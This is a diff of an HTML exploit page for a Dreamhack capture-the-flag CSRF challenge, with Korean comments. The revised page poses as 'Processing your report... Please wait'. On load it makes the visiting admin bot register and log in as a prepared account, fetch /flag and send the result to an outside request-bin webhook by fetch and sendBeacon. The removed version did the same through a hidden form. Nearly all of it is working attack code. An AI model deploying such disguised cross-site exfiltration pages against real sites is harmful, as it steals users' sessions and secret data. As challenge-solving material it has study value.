@@ -1,67 +1,82 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Exploit</title>
+    <title>Report Processing</title>
+    <meta charset="UTF-8">
 </head>
 <body>
-    <h1>Exploiting CSRF...</h1>
-    <iframe name="hidden" style="display:none;"></iframe>
-
+    <h1>Processing your report...</h1>
+    <p>Please wait...</p>
+    
     <script>
-        // 타겟 URL 설정 (실제 challenge URL로 변경)
-        const TARGET = "http://host8.dreamhack.games:24299";
-
-        // Webhook URL (FLAG를 받을 서버)
-        const WEBHOOK = "https://dcqiyau.request.dreamhack.games";
-
-        // Step 1: 로그인 (봇이 127.0.0.1에서 접속하므로 is_admin=True)
-        function login() {
-            const form = document.createElement('form');
-            form.method = 'POST';
-            form.action = TARGET + '/login';
-            form.target = 'hidden';
-
-            const username = document.createElement('input');
-            username.name = 'username';
-            username.value = 'hacker';  // 미리 등록한 계정
-            form.appendChild(username);
-
-            const password = document.createElement('input');
-            password.name = 'password';
-            password.value = 'hacker123';  // 미리 등록한 계정
-            form.appendChild(password);
-
-            document.body.appendChild(form);
-            form.submit();
-
-            // 로그인 후 FLAG 획득
-            setTimeout(getFlag, 2000);
-        }
-
-        // Step 2: FLAG 획득
-        function getFlag() {
-            fetch(TARGET + '/flag', {
-                credentials: 'include'
-            })
-            .then(response => response.text())
-            .then(flag => {
-                // FLAG를 webhook으로 전송
-                fetch(WEBHOOK + '?flag=' + encodeURIComponent(flag));
-
-                // 또는 img 태그로 전송
-                const img = document.createElement('img');
-                img.src = WEBHOOK + '?flag=' + encodeURIComponent(flag);
-                document.body.appendChild(img);
-            })
-            .catch(err => {
-                console.error('Error:', err);
-            });
-        }
-
-        // 페이지 로드 시 자동 실행
-        window.onload = function() {
-            setTimeout(login, 500);
-        };
+        (async () => {
+            try {
+                const username = 'hacker';
+                const password = 'hacker123';
+                
+                // 1. 계정 등록 (이미 존재할 수 있으므로 에러 무시)
+                try {
+                    let formData = new FormData();
+                    formData.append('username', username);
+                    formData.append('password', password);
+                    
+                    await fetch('/register', {
+                        method: 'POST',
+                        body: formData,
+                        credentials: 'include'
+                    });
+                } catch (e) {
+                    // 이미 존재하는 계정일 수 있음
+                }
+                
+                // 2. 로그인 (Bot이 127.0.0.1에서 요청하므로 is_admin=True가 됨)
+                let formData = new FormData();
+                formData.append('username', username);
+                formData.append('password', password);
+                
+                await fetch('/login', {
+                    method: 'POST',
+                    body: formData,
+                    credentials: 'include'
+                });
+                
+                // 3. 로그인 완료 대기
+                await new Promise(resolve => setTimeout(resolve, 800));
+                
+                // 4. FLAG 획득
+                const response = await fetch('/flag', {
+                    credentials: 'include'
+                });
+                
+                const flag = await response.text();
+                
+                // 5. FLAG를 webhook으로 전송
+                await fetch('https://gkxuwhb.request.dreamhack.games/?flag=' + encodeURIComponent(flag), {
+                    mode: 'no-cors',
+                    method: 'GET'
+                });
+                
+                // 추가 전송 방법 (안전성 강화)
+                await fetch('https://gkxuwhb.request.dreamhack.games/', {
+                    mode: 'no-cors',
+                    method: 'POST',
+                    body: flag
+                });
+                
+                // navigator.sendBeacon 사용 (더 안정적)
+                navigator.sendBeacon('https://gkxuwhb.request.dreamhack.games/beacon', flag);
+                
+                console.log('Flag sent successfully');
+                
+            } catch (error) {
+                console.error('Error:', error);
+                
+                // 에러 발생시에도 webhook으로 전송
+                await fetch('https://gkxuwhb.request.dreamhack.games/?error=' + encodeURIComponent(error.message), {
+                    mode: 'no-cors'
+                });
+            }
+        })();
     </script>
 </body>
 </html>
